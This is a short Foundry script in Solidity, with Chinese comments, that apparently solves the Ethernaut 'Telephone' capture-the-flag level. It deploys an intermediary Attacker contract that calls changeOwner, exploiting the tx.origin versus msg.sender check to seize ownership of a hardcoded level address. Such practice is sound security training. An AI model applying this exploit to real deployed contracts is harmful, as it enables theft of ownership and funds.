// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Telephone} from "../src/lelvel04/Telephone.sol";

contract Attacker {
    address targetAddr;
    constructor(address targetAddr_) {
        targetAddr = targetAddr_;
    }

    function attack() public payable {
        Telephone target = Telephone(targetAddr);

        address owner = tx.origin;
        target.changeOwner(owner);
    }
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        // 假设合约已经部署在这个地址
        address levelAddr = 0x231014b0FEf1C0AF96189700a43221fACF1DfF7E;

        Attacker attacker = new Attacker(levelAddr);

        // 攻击合约发动攻击
        attacker.attack();

        vm.stopBroadcast();
    }
}
